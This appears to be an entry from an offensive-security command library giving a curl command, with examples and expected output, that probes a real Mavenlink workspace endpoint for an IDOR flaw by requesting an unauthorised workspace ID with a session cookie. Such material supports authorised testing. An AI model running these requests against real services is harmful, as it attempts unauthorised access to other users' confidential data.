---
data: >-
  curl -H "Cookie: session=your_session_cookie" -v
  "https://app.mavenlink.com/workspaces/456"
tags:
  - web
  - recon
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:30.024Z'
id: dc636c53-6ff5-46eb-8369-aae827378d45
verified: false
validated: true
submitted: true
---
# curl-get-workspace

## Command

```bash
curl -H "Cookie: session=your_session_cookie" -v "https://app.mavenlink.com/workspaces/456"
```

## Description

This command uses curl to perform an HTTP GET request to a Mavenlink workspace endpoint with a manipulated ID, simulating an IDOR attack. It includes session authentication via cookie and verbose output to capture error details for information disclosure analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: session=..."` | Authenticates the request with the session cookie from a logged-in browser session | Yes |
| `-v` | Enables verbose mode to display request/response headers and body | Yes |
| URL argument | The target endpoint with unauthorized workspace ID (e.g., /workspaces/456) | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" "https://app.mavenlink.com/workspaces/456"
```

### Advanced Usage

```bash
curl -H "Cookie: session=abc123" -v -H "User-Agent: Mozilla/5.0" "https://app.mavenlink.com/workspaces/456"
```

## Expected Output

Verbose output showing the full HTTP exchange, including a 403 response body with leaked workspace title, e.g., "<html><body>Access denied to 'Confidential Workspace'</body></html>".

## Related

- [[Related Procedure: Exploit-Mavenlink-IDOR-for-Workspace-Disclosure]]
